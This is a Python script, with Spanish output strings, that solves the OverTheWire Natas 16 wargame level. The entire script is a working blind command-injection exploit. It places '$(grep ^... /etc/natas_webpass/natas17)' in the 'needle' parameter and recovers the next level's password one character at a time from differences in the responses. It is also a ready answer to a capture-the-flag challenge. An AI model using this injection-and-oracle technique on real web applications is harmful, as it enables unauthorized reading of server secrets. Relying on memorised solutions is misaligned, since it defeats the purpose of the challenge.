import requests
from string import ascii_letters, digits

chars = ascii_letters + digits
url = "http://natas16.natas.labs.overthewire.org"
auth = ('natas16', '<contraseñaNatas16>')
found = ""

while True:
    for c in chars:
        payload = f'$(grep ^{found + c} /etc/natas_webpass/natas17)'
        r = requests.get(url, auth=auth, params={'needle': payload})
        if "dictionary" not in r.text:  
            found += c
            print(f"[+] Encontrada: {found}")
            break
    else:
        break

print("Contraseña:", found)
